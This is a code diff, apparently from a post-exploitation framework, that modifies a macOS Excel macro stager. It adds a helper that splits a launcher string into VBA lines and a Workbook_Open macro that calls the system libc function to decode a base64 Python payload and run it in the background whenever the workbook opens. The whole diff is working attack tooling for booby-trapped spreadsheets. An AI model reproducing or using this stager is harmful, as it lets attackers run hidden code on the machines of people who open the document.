@@ -1,4 +1,5 @@
 from lib.common import helpers
+import re
 
 class Stager:
 
@@ -61,10 +62,21 @@ class Stager:
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-
+    
 
     def generate(self):
-
+        def formStr(varstr, instr):
+             holder = []
+             str1 = ''
+             str2 = ''
+             str1 = varstr + ' = "' + instr[:54] + '"' 
+             for i in xrange(54, len(instr), 48):
+                holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
+                str2 = '"\r\n'.join(holder)
+             
+             str2 = str2 + "\""
+             str1 = str1 + "\r\n"+str2
+             return str1
         # extract all of our options
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -80,16 +92,19 @@ class Stager:
             return ""
 
         else:
-
             launcher = launcher.replace("\"", "\"\"")
+            for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
+                payload = formStr("cmd", match)
 
             macro = """
 Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
 
 Private Sub Workbook_Open()
     Dim result As Long
-    result = system("%s")
+    Dim cmd As String
+    %s
+    result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
 End Sub
-""" %(launcher)
+""" %(payload)
 
             return macro
